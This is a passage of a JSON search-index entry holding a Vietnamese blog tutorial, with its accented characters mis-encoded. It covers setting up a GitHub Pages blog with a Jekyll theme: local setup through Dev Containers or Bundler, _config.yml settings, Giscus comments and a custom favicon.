b∆∞·ªõc th·ª±c hi·ªán: ƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u003cusername\u003e.github.io, thay ƒë·ªïi \u003cusername\u003e th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog: Sau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container. C√°c b∆∞·ªõc th·ª±c hi·ªán: C√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø. C√°c b∆∞·ªõc th·ª±c hi·ªán: L√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y: bundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm: lang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠. C√°c b∆∞·ªõc th·ª±c hi·ªán: C√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u003cusername\u003e/\u003cusername\u003e.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes C√°c b∆∞·ªõc th·ª±c hi·ªán: Truy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"}]